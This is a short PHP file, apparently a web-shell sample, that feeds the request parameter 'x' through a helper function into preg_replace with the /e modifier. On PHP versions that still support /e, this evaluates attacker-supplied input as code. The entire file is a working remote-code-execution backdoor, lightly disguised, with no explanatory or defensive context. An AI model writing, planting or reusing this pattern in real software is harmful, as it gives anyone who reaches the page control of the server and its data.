<?php
function func(){
return $_REQUEST['x'];
}
preg_replace("/test/e",func(),"i am test");
?>